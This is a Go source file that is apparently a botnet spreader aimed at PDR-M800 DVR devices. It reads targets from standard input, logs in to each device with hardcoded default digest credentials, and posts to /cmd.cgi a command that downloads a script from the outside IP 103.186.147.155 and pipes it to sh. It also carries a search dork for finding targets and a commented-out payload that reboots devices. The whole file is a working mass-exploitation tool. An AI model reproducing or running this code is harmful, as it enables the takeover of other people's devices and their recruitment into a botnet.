package main

// apt install golang git -y; go get github.com/xinsnake/go-http-digest-auth-client

import (
	"bufio"
	"fmt"
	"io/ioutil"
	"net"
	"net/http"
	"os"
	"runtime"
	"strings"
	"sync"
	"time"

	dac "github.com/xinsnake/go-http-digest-auth-client"
)

//"strconv"

//"bytes"

/*
   Dork: "PDR-M800" !cloud !honeypot !citrix WWW-Authenticate: Digest realm
*/

var (
	port = os.Args[1]
	wg   sync.WaitGroup

	timeout = 10 * time.Second

	processed uint64
	found     uint64
	exploited uint64

	//payload = "sh%20-c%20%27chmod%20777%20%2Fsbin%2Freboot%3B%20%2Fsbin%2Freboot%3B%20chmod%20777%20%2Fbin%2Freboot%3B%20%2Fbin%2Freboot%3B%20reboot%3B%27%20%26" // reboot the devices

	payload = "sh%20-c%20%27wget%20http%3A%2F%2F103.186.147.155%2Fatp%20-O-%7Csh%27%20%26"
)

func findDevice(target string) bool {
	conn, err := net.DialTimeout("tcp", target, timeout)

	if err != nil {
		return false
	}

	defer conn.Close()

	conn.SetDeadline(time.Now().Add(timeout))
	conn.Write([]byte("GET / HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: Hello World\r\n\r\n"))

	buff := make([]byte, 1024)
	conn.Read(buff)

	return strings.Contains(string(buff), "PDR-M800")
}

func loginDevice(target string) bool {

	t := dac.NewTransport("pineadmin", "000000")
	req, err := http.NewRequest("GET", "http://"+target+"/cmd.cgi", nil)

	if err != nil {
		return false
	}

	resp, err := t.RoundTrip(req)

	if err != nil {
		return false
	}

	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)

	return strings.Contains(string(body), "document.all.cmd_result")
}

func exploitDevice(target string) {

	processed++

	wg.Add(1)
	defer wg.Done()

	if !findDevice(target) {
		return
	}

	found++

	if !loginDevice(target) {
		return
	}

	dr := dac.NewRequest("pineadmin", "000000", "POST", "http://"+target+"/cmd.cgi", "cmd="+payload)
	dr.Execute()

	fmt.Printf("[PDVR] exploiting %s\n", target)
	exploited++
}

func titleWriter() {
	for {
		fmt.Printf("Processed: %d | Found: %d | Exploited: %d | Go Routines: %d\n",
			processed, found, exploited, runtime.NumGoroutine())
		time.Sleep(1 * time.Second)
	}
}

func main() {

	scanner := bufio.NewScanner(os.Stdin)

	go titleWriter()

	count := 0

	for scanner.Scan() {
		if port == "manual" {
			go exploitDevice(scanner.Text())
		} else {
			go exploitDevice(scanner.Text() + ":" + port)
		}
		count++
		if count > 1024 {
			time.Sleep(2 * time.Second)

			count = 0
		}
	}

	time.Sleep(10 * time.Second)
	wg.Wait()
}
